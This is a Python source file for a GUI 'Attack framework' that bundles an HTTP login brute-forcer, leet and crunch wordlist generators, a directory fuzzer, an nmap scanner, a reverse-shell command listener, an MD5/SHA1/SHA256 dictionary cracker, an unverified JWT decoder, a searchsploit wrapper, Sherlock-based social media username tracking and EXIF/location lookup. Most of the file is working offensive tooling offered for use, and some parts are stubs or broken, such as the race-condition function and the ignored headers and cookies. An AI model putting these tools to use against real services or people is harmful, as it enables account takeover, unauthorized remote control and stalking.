import PySimpleGUI as sg
import hashlib
import requests
import json
import os
import socket
import re
import subprocess
import itertools
import threading
from termcolor import colored
import pprint
import jwt
import nmap3


def nmap_scan(target: str):
    print (f"Starting service scan on target {target}")
    nmap = nmap3.Nmap()
    results = nmap.scan_top_ports(target)
    pprint.pprint(results)


def service_scanner():
    sg.theme('DarkAmber')
    layout = [  [sg.Text('Enter Target: '), sg.InputText()],[sg.Button('Scan'), sg.Button('Cancel')] ]
    window = sg.Window('Service Scanner', layout)
    while True:
        event, values = window.read()
        if event == sg.WIN_CLOSED or event == 'Cancel': 
            break
        else:
            threading.Thread(target=nmap_scan, args=(values[0],), daemon=True).start()
    window.close()


def valid_ip(ip: str) -> bool:
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def reverse_DNS(ip: str) -> bool:
    try:
        reversed_ip = socket.gethostbyaddr(ip)
        if "herokuapp" in reversed_ip[0]:
            return True
        else:
            return False
    except socket.error:
        return False


def valid_address(adress: str) -> (str, bool):
    if "herokuapp" not in adress:
        vi = valid_ip(adress)
        if vi:
            return ("Valid IP address!",reverse_DNS(adress))
        else:
            adress = adress.replace(".", "")
            if adress.isdigit():
                return ("Wrong IP format", False)
            else:
                return ("Wrong domain!", False)
    else:
        regex = re.findall(r'[:\/\-\.0-9A-Za-z]+\.com(?:[\/|:][:#\.\/a-zA-Z0-9]*)?', adress)[0]
        if regex != adress:
            return ("Wrong domain", False)
        return ("Match domain", True)


def is_json(myjson: str) -> bool:
    try:
        json.loads(myjson)
        return True
    except:
        return False


def requester(endpoint: str, method: str, wordlist: str, payload: str, headers: str, cookies: str):
    if "http" not in endpoint:
        endpoint = "http://" + endpoint
    with open(wordlist, "r") as fd:
        content = fd.read()
    content = content.split("\n")
    if headers:
        headers = {}
    if cookies:
        cookies = {}
    for x in content:
        new_payload = json.loads(payload.split("|")[0])
        new_payload[payload.split("|")[1].strip(" ")] = x
        r = requests.post(endpoint, data=new_payload,
                        headers=headers, cookies=cookies)
        yield x, r.status_code



def create_gui() -> (list, sg.PySimpleGUI.Window):
    radio_choices = ['GET', 'POST', 'PUT', 'PATCH']
    sg.theme('DarkAmber')
    layout = [[sg.Text('Endpoint')], [sg.InputText(size=(80, 10))],
            [sg.Text('Method')], [sg.Radio(text, 1) for text in radio_choices],
            [sg.Text('Payload (also supply the value you want to replace after | )')], [
        sg.InputText(size=(80, 10))],
        [sg.Text('Headers')], [sg.InputText(size=(80, 10))],
        [sg.Text('Cookies')], [sg.InputText(size=(80, 10))],
        [sg.Text('Give word for leet')],[sg.InputText(size=(30, 10))], [sg.Button('Leet it')],
        [sg.Text('Chars, min, max')],[sg.InputText(size=(30, 10))], [sg.Button('Combine it')],
        [sg.Text('Wordlist')], [sg.FileBrowse(), sg.InputText(size=(68, 10))],
        [sg.Button('Launch Attack'), sg.Button('Clear')],
        [sg.Multiline(size=(64, 30), font=('Courier New', 12), disabled=False,  background_color='grey20', pad=(15, (15, 15)), key='textbox', autoscroll=True)]]
    return radio_choices, sg.Window('Python Brute_Forcer', layout, size=(630, 900))
    



def leet_words(word: str) -> list:
    replacers = {'o': '0', 'l': '1', 'i': '1', 'z': '2', 'e': '3',
               'a': '4', 's': '5', 'g': '6', 't': '7', 'b': '8', 'g': '9', 'a': '@'}
    combs = []
    for x in word.lower():
        leet_char = replacers.get(x, x)
        combs.append((x,) if leet_char == x else (x, leet_char))
    return [''.join(x) for x in itertools.product(*combs)]


def upper_leet(combo: str) -> list:
    return list(map(''.join, itertools.product(*(sorted(set((x.upper(), x.lower()))) for x in combo))))


def create_leets(word: str):
    long_list = []
    for x in leet_words(word):
        long_list.extend(upper_leet(x))
    with open("leet_word.txt", "w") as fd:
        for x in long_list:
            fd.write(x + '\n')


def leet_it(word: str):
    create_leets(word)


def combine_it(combo: list):
    subprocess.Popen(f"crunch {int(combo[1])} {int(combo[2])} {combo[0]} -o combined.txt", shell=True)

def gui_funct():
    radio_choices, window = create_gui()
    strok = ""
    nr = 1
    while True:
        event, values = window.read()
        method = None
        if event == None:
            break
        if event == "Clear":
            strok = ""
            nr = 1
            window['textbox'].update("")
            window.Refresh()
        if event == "Combine it":
            arg = values[9].split(" ")
            if len(arg) == 3:
                if arg[1].isdigit() and arg[2].isdigit() and arg[1] <= arg[2]:
                    combine_it(arg)
            else:
                window['textbox'].update("Only 3 blocks allowed/ Min and Max must be positive integers/ Max must be equal or higher than min!")
                window.Refresh()
        if event == "Leet it":
            if values[8] and values[8].isalpha():
                leet_it(values[8])
            else:
                window['textbox'].update("No empty string/ Only letters allowed!")
                window.Refresh()
        if event == "Launch Attack":
            for x in range(1, 5):
                if values[x] == True:
                    method = radio_choices[x-1]
                    break
            if values[0] == "" or values['Browse'] == "" or method == None or values[5] == "":
                window['textbox'].update("Fill all the inputs!")
                window.Refresh()
            else:
                window['textbox'].update("")
                window.Refresh()
                msg, cap = valid_address(values[0])
                if cap == True and msg == "Match domain":
                    if len(values[5].split("|")) == 2:
                        if is_json(values[5].split("|")[0]):
                            if len(values[5].split("|")[0]) >= 1:
                                if len([x for x in json.loads(values[5].split("|")[0]) if x == values[5].split("|")[1].strip(" ")]) == 1:
                                    for value, status_code in requester(values[0], method, values["Browse"], values[5], values[6], values[7]):
                                        if value != "":
                                            strok += f"{nr}) {value} \t\t\t\t Status_code: {status_code}\n"
                                            window['textbox'].update(strok)
                                            window.Refresh()
                                            nr += 1
                                        if status_code == 200:
                                            strok += f"FOUND! It is {value}\n"
                                            window['textbox'].update(strok)
                                            window.Refresh()
                                            break
                            else:
                                window['textbox'].update("Given input not found in JSON")
                                window.Refresh()
                        else:
                            window['textbox'].update("Payload is not in JSON format")
                            window.Refresh()
                    else:
                        window['textbox'].update("Give correct format for payload!")
                        window.Refresh()
                else:
                    message = msg + "\t\t" + str(cap)
                    window['textbox'].update(message)
                    window.Refresh()
    window.close()


def fuzz_them(url_local: str):
    home_page_l = 1924
    with open("wordlist_test.txt", "r") as fd:
        content = fd.read()
    content = content.split("\n")
    for FUZZ in content:
        url = url_local + FUZZ.strip(" ")
        r = requests.get(url)
        if len(r.content) > home_page_l:
            print(url + " " * (80-len(url)) + colored(f'--> Found! [{FUZZ}]', 'green'))
        else:
            print(url + " " * (80-len(url)) + colored(f"<-- Nothing", 'red'))
    print ("END!")


def http_fuzzer():
    sg.theme('DarkAmber')
    layout = [  [sg.Text('Enter URL: '), sg.InputText()],[sg.Button('Fuzz'), sg.Button('Cancel')] ]
    # Create the Window
    window = sg.Window('HTTP  fuzzer', layout)
    # Event Loop to process "events" and get the "values" of the inputs
    while True:
        event, values = window.read()
        if event == sg.WIN_CLOSED or event == 'Cancel': # if user closes window or clicks cancel
            break
        else:
            threading.Thread(target=fuzz_them, args=(values[0],), daemon=True).start()
    window.close()

def multiple_likes():
    import datetime
    now = datetime.datetime.now()
    print (f"Sending data at {now.hour}:{now.minute}:{now.second}")



def race_condition():
    threading.Thread(target = multiple_likes).start()
    threading.Thread(target = multiple_likes).start()
    threading.Thread(target = multiple_likes).start()

def sherlockz():
    sg.theme('DarkAmber')
    layout = [  [sg.Text('Enter nick to search: '), sg.InputText()],[sg.Button('Track'), sg.Button('Cancel')] ]
    window = sg.Window('Hunt down profiler', layout)
    while True:
        event, values = window.read()
        if event == sg.WIN_CLOSED or event == 'Cancel': 
            break
        else:
            threading.Thread(target=track_me, args=(values[0],), daemon=True).start()
    window.close()


def track_me(nick: str):
    import sys
    sys.path.insert(1, 'sherlock/sherlock')
    import sherlock
    sys.argv.append(nick)
    sherlock.main()
    print ("Tracking social media finished")
    

def create_reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 8001
    s.bind(("localhost", port))
    s.listen(1)
    print (f'[+] Listening for incoming TCP connection on port {port}')
    conn, addr = s.accept()
    print ('[+] We got a connection from: ', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            conn.send(command.encode())
            print (conn.recv(1024).decode())

def decode_jwt():
    sg.theme('DarkAmber')
    layout = [  [sg.Text('Enter JWT: '), sg.InputText()],
                [sg.Button('Decode'), sg.Button('Cancel')] ]
    # Create the Window
    window = sg.Window('JWT decoder', layout)
    # Event Loop to process "events" and get the "values" of the inputs
    while True:
        event, values = window.read()
        if event == sg.WIN_CLOSED or event == 'Cancel': # if user closes window or clicks cancel
            break
        try:
            token = values[0]
            decoded = jwt.decode(token, options={"verify_signature": False})
            print ("-" * 30)
            print (token + "\n")
            for x,y in decoded.items():
                print (x," -> ",y)
            print ("-" * 30)
        except:
            print ("JWT not well formated")
    window.close()

def searchsploit(keyword: str):
    subprocess.call(["searchsploit"] + keyword.split(" "))

def vuln_scans():
    sg.theme('DarkAmber')
    layout = [  [sg.Text('Enter keyword: '), sg.InputText()],
                [sg.Button('Search'), sg.Button('Cancel')] ]
    # Create the Window
    window = sg.Window('CVE founder', layout)
    # Event Loop to process "events" and get the "values" of the inputs
    while True:
        event, values = window.read()
        if event == sg.WIN_CLOSED or event == 'Cancel': # if user closes window or clicks cancel
            break
        try:
            threading.Thread(target=searchsploit,args=(values[0],), daemon=True).start()
        except:
            print ("Something is wrong")
    window.close()


def create_pc_gui() -> (list, sg.PySimpleGUI.Window):
    sg.theme('DarkAmber')
    layout = [[sg.Text('Hash to crack')], [sg.InputText(size=(80, 10))],
              [sg.Text('Type')], [sg.Button('Get type')],
              [sg.Multiline(size=(64, 1), font=('Courier New', 12), disabled=False, background_color='grey20',pad=(15, (15, 15)), key='textbox3', autoscroll=True)],
              [sg.Text('Wordlist')], [sg.FileBrowse(), sg.InputText(size=(68, 10))],
              [sg.Button('Crack!'), sg.Button('Clear')],
              [sg.Multiline(size=(64, 5), font=('Courier New', 12), disabled=False,  background_color='grey20', pad=(15, (15, 15)), key='textbox2', autoscroll=True)]]
    return sg.Window('Python Password_Cracker', layout, size=(630, 400))



def sha1_decrypt(inputhash: str, pwlist: str) -> str:
    word = ' not in list or the hash is not SHA1 type.'
    with open(pwlist, "r") as fr:
        content = fr.read()
    content = content.split("\n")
    for guess in content:
        hashedguess = hashlib.sha1(bytes(guess, 'utf-8')).hexdigest()
        if hashedguess == inputhash.lower():
            word = guess
            break
    return word


def sha256_decrypt(inputhash: str, pwlist: str) -> str:
    word = ' not in list or the hash is not SHA256 type.'
    with open(pwlist, "r") as fr:
        content = fr.read()
    content = content.split("\n")
    for guess in content:
        hashedguess = hashlib.sha256(bytes(guess, 'utf-8')).hexdigest()
        if hashedguess == inputhash.lower():
            word = guess
            break
    return word


def md5_decrypt(inputhash: str, pwlist: str) -> str:
    word = ' not in list or the hash is not MD5 type.'
    with open(pwlist, "r") as fr:
        content = fr.read()
    content = content.split("\n")
    for guess in content:
        hashedguess = hashlib.md5(bytes(guess, 'utf-8')).hexdigest()
        if hashedguess == inputhash.lower():
            word = guess
            break
    return word


def get_type(inputhash: str) -> str:
    hash_type = ""
    if len(inputhash) == 32 or len(inputhash) == 40 or len(inputhash) == 64:
        if len(inputhash) == 32:
            hash_type = "MD5"
        elif len(inputhash) == 40:
            hash_type = "SHA1"
        elif len(inputhash) == 64:
            hash_type = "SHA256"
    else:
        hash_type = "Hash type not supported or not hash."
    return hash_type


def gui_pc_funct():
    window = create_pc_gui()
    while True:
        event, values = window.read()
        if event == None:
            break
        if event == "Clear":
            window['textbox2'].update("")
            window['textbox3'].update("")
            window.Refresh()
        if event == "Get type":
            arg = values[0]
            if arg != "":
                result = get_type(arg)
                window['textbox3'].update(result)
                window.Refresh()
            else:
                window['textbox3'].update("Please insert the hash to crack...")
                window.Refresh()
        if event == "Crack!":
            if values[0] != "" and values["Browse"] != "":
                arg2 = get_type(values[0])
                if arg2 == "MD5":
                    window['textbox2'].update("Password is: " + md5_decrypt(values[0],values["Browse"]) )
                elif arg2 == "SHA1":
                    window['textbox2'].update("Password is: " + sha1_decrypt(values[0],values["Browse"]))
                elif arg2 == "SHA256":
                    window['textbox2'].update("Password is: " + sha256_decrypt(values[0],values["Browse"]))
                else:
                    window['textbox2'].update("The hash type is not supported or not a hash")
                    window.Refresh()
            else:
                window['textbox2'].update("Missing hash or wordlist path.")
                window.Refresh()
    window.close()


def create_osint_gui() -> (list, sg.PySimpleGUI.Window):
    sg.theme('DarkAmber')
    layout = [[sg.Text('Enter coordinates'), sg.InputText(size=(68, 10))],[sg.Button('Track coordonate')],[sg.FileBrowse("Choose picture"), sg.InputText(size=(68, 10))],[sg.Button('Extract EXIF')],
              ]
    return sg.Window('OSINT', layout, size=(630, 150))


def gui_osint_funct():
    window = create_osint_gui()
    while True:
        event, values = window.read()
        if event == None:
            break
        if event == "Track coordonate" and values[0]:
            from geopy.geocoders import Nominatim
            geolocator = Nominatim(user_agent="http")
            location = geolocator.reverse(values[0])
            print(values[0], " --> ", location.address)
        if event == "Extract EXIF" and values[1]:
            import exifread
            with open(values[1], 'rb') as fd:
                tags = exifread.process_file(fd)
                if tags:
                    for tag in tags.keys():
                        if tag not in ('JPEGThumbnail', 'TIFFThumbnail', 'Filename', 'EXIF MakerNote'):
                            print (tag, tags[tag])
                else:
                    print ("No EXIF data found!")
    window.close()


def create_initial_gui():
    sg.theme('Reddit')  
    layout = [[sg.Button('Decode JWT',size=(10, 2)), sg.Button('Reverse shell',size=(10, 2))], [sg.Button('Brute forcer',size=(10, 2)), sg.Button('HTTP Fuzzer',size=(10, 2))], [sg.Button('Race Condition',size=(10, 2)), sg.Button('Social Media Tracker',size=(10, 2))], [sg.Button('Password\ncracker',size=(10, 2)),sg.Button('OSINT',size=(10, 2))],[sg.Button('CVE finder',size=(10, 2)),sg.Button('Service\nscanner',size=(10, 2))],[sg.Button('Exit',size=(10, 2))]]
    window = sg.Window('Attack framework', layout)
    while True:
        event, values = window.read()
        if event == sg.WIN_CLOSED or event == 'Exit':
            break
        if event == 'Password\ncracker':
            gui_pc_funct()
        if event == "OSINT":
            gui_osint_funct()
        if event == 'Brute forcer':
            gui_funct()
        if event == 'Decode JWT':
            decode_jwt()
        if event == 'HTTP Fuzzer':
            http_fuzzer()
        if event == 'Service\nscanner':
            service_scanner()
        if event == "CVE finder":
            vuln_scans()
        if event == 'Reverse shell':
            create_reverse_shell()
        if event == 'Race Condition':
            race_condition()
        if event == 'Social Media Tracker':
            sherlockz()
    window.close()


def main():
    create_initial_gui()

if __name__ == "__main__":
    main()
    